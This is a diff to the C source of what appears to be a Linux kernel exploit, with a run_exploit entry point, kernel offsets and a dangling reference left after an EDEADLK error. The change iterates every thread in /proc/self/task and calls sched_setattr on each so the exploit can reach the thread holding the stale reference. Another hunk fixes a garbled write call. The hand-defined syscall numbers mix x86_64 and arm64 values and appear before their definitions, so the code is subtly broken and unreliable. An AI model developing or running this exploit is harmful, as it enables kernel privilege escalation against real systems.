@@ -8,6 +8,8 @@
 #include "common.h"
 #include <sys/mount.h>
 #include <fcntl.h>
+#include <dirent.h>
+#include <stdlib.h>
 #include "offsets.h"
 #include <sys/ioctl.h>
 #include <sys/mman.h>
@@ -282,7 +284,39 @@ void *consumer_thread(void *arg __attribute__((unused))) {
         errno = 0;
         if (env_flag("MODE4_CFI_ON_PUNCH", 0) || env_flag("MODE4_PROOF", 0))
           durable_proof_log("pre_setattr");
-        long sched_ret = sched_setattr_tid(tid, consumer_nice);
+        long sched_ret;
+        if (env_flag("PUNCH_ALL_TIDS", 1)) {
+          /* The EDEADLK can leave the dangling on ANY task of the process
+           * (QEMU lldb-proven: a clone held it while the waiter's own field
+           * was clean). sched_setattr EVERY tid; the holder gets walked. */
+          sched_ret = 0;
+          static int punch_dir_checked = 0;
+          (void)punch_dir_checked;
+          int df = open("/proc/self/task", O_RDONLY | O_DIRECTORY);
+          if (df >= 0) {
+            char dentbuf[4096];
+            for (;;) {
+              int dn = syscall(SYS_getdents64, df, dentbuf, sizeof(dentbuf));
+              if (dn <= 0) break;
+              for (int dp = 0; dp < dn;) {
+                struct dirent64 *de = (void *)(dentbuf + dp);
+                if (de->d_name[0] >= '0' && de->d_name[0] <= '9') {
+                  int t2 = atoi(de->d_name);
+                  if (t2 > 0 && t2 != (int)syscall(SYS_gettid)) {
+                    errno = 0;
+                    sched_ret |= sched_setattr_tid(t2, consumer_nice);
+                  }
+                }
+                dp += de->d_reclen;
+              }
+            }
+            close(df);
+          } else {
+            sched_ret = sched_setattr_tid(tid, consumer_nice);
+          }
+        } else {
+          sched_ret = sched_setattr_tid(tid, consumer_nice);
+        }
         pr_info("consumer punch tid=%d sched_ret=%ld errno=%d\n", tid,
                 sched_ret, errno);
         if (env_flag("QEMU_INIT", 0)) {
@@ -393,7 +427,7 @@ void run_main_route_threads(void) {
       char mb[96];
       int mn = snprintf(mb, sizeof(mb), "main_cmp_done ret=%ld errno=%d", rret, rerr);
       if (mn > 0) (void)write(mf, mb, (size_t)mn);
-      (void)write(mf, """ + '"' + BS + 'n' + '"' + """, 1);
+      (void)write(mf, "\n", 1);
       close(mf);
     }
   }
@@ -748,6 +782,9 @@ static pid_t spawn_child(struct child_pipes *p) {
   close(p->task_w); close(p->cmd_r); close(p->uid_w);
   return child;
 }
+
+#define SYS_getdents64 217
+#define SYS_gettid 178
 
 int run_exploit(int argc, char **argv) {
   (void)argc; (void)argv;
